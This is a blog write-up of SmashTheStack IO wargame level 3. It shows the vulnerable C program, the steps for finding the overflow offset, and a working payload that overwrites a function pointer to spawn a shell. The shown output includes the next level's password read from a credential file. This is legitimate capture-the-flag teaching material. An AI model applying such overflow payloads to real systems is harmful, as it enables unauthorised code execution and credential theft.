---
layout: post
title: "SmashTheStack IO Level 3"
date: 2014-07-07 21:37:07 +0300
comments: true
categories: [writeups, wargames]
keywords: smash the stack, wargames, smashthestack io, smashthestack io level 3, smashthestack
description: SmashTheStack IO Level 3
---

This is the source code for level03.c:
<!-- more -->

``` c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

#### Function overview


**memcpy**

_void *memcpy(void *dest, const void *src, size_t n);_

Copies  *n* bytes from memory area *src* to memory area *dest*. The memory areas must not overlap.

The function does not check for any terminating null character in *src*.

Returns a pointer to *dest*.



**memset**

_void *memset(void *buf, int value, size_t count);_

*buf* = Pointer to the block of memory to fill.

*value* = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.

*count* = Number of bytes to be set to the value.

Sets the first *count* bytes of the block of memory pointed by *buf* to the specified *value*

Returns a pointer to the memory area *buf*

The most common use of *memset()* is to initialize a region of memory to some known value.


#### Program description

Running the program we see this:

``` plain
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.

I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:

``` plain
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

So EIP points to some junk that I provided with the string. Let's check the offset:

``` plain
./pattern_offset.rb 0x63413563
[*] Exact match at offset 76
```

Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:

``` plain
level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.2$ whoami
level4
sh-4.2$ cat /home/level4/.pass
9C4Jxjc3O3IjB7nXej
```

We hijacked the execution flow and made EIP point to the address of the function we needed.

> The surest protection against temptation is cowardice. 

> -- Mark Twain

